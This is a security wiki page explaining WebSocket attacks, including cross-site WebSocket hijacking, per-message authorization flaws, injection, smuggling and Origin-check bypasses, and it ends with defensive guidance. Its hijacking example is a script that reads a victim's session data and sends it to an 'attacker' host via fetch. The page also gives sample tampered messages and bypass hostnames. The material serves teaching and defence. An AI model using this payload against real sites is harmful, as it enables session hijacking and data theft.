---
title: WebSocket attacks
slug: websocket-attacks
---

> **TL;DR:** CSWSH, message-level auth flaws, origin policy abuse, smuggling over WS.

## What it is
The WebSocket handshake is just an HTTP upgrade; once established, the channel is a persistent bidirectional pipe with no per-message HTTP semantics. Same-origin policy applies only to the initial handshake — and only if the server validates `Origin`. Many bugs come from the asymmetric model: developers authenticate the handshake but never re-check authorization on individual messages, and CORS does not apply, so cross-site requests to WS endpoints succeed by default.

## Preconditions / where it applies
- App exposes a WS endpoint (`wss://target/api`) used for authenticated actions
- Authentication via session cookie carried on the upgrade request
- Server fails to validate `Origin` (CSWSH) or fails to authorize per-message (privilege escalation within session)

## Technique
**Cross-Site WebSocket Hijacking (CSWSH).** Cookies are ambient on the upgrade request. If the server doesn't check `Origin`, attacker-origin JS opens a WS to the target and inherits the victim's session:

```html
<script>
let ws = new WebSocket('wss://target.com/api');
ws.onopen = () => ws.send(JSON.stringify({cmd:'list_secrets'}));
ws.onmessage = e => fetch('https://attacker/?d=' + btoa(e.data));
</script>
```

**Message-level authz.** A session legitimately authorised for user A sends `{"op":"read","id":42}`. Try `{"op":"delete","id":42}` or `{"op":"read","id":1}` — many apps trust the channel after auth and skip per-message checks. Classic [[idor]] tunnelled through WS.

**Injection over WS.** Messages are usually JSON; sinks at the server still apply. Try SQLi, XSS (broadcast to other clients), command injection, [[deserialisation]] gadgets in serialized payloads. Burp's WebSocket history + Repeater are the canonical tools.

**Handshake smuggling / desync.** Some reverse proxies upgrade the connection but the backend reuses it for HTTP — see [[http-request-smuggling]]. Some misroute path-based: send the upgrade to `/ws` with `Host:` for a different vhost.

**Authentication binding.** Token in URL (`?token=…`) leaks to logs and Referer. Token only in the first message, with no per-message rebind, races against reconnects.

**Compression / extensions.** `permessage-deflate` plus user-controlled prefix gives a CRIME-style oracle for repeated secrets in messages.

Origin validation bypass: server checks `Origin` is "target.com" via `startsWith` → bypass with `https://target.com.attacker.com` or `https://target.complete-attacker.com`. Always require exact match.

Related: [[csrf]] (CSWSH is the WS analogue), [[cors-misconfig]].

## Detection and defence
- Validate `Origin` against an exact allowlist on the upgrade handler — reject mismatches
- Bind WS session to an unguessable token sent in the first message *after* upgrade (not a cookie)
- Authorize every inbound message — never trust ambient session for action selection
- Set `SameSite=Strict` on session cookies where compatible — kills cross-site upgrade with cookies
- Rate-limit messages per connection; log connection-level events
- Inspect WS traffic in your IDS / SIEM the same way you do HTTP

## References
- [PortSwigger — WebSockets security](https://portswigger.net/web-security/websockets) — labs, CSWSH
- [HackTricks — WebSocket attacks](https://book.hacktricks.wiki/en/pentesting-web/websocket-attacks.html) — message-level fuzzing
- [Christian Schneider — CSWSH](https://www.christian-schneider.net/blog/cross-site-websocket-hijacking/) — original write-up
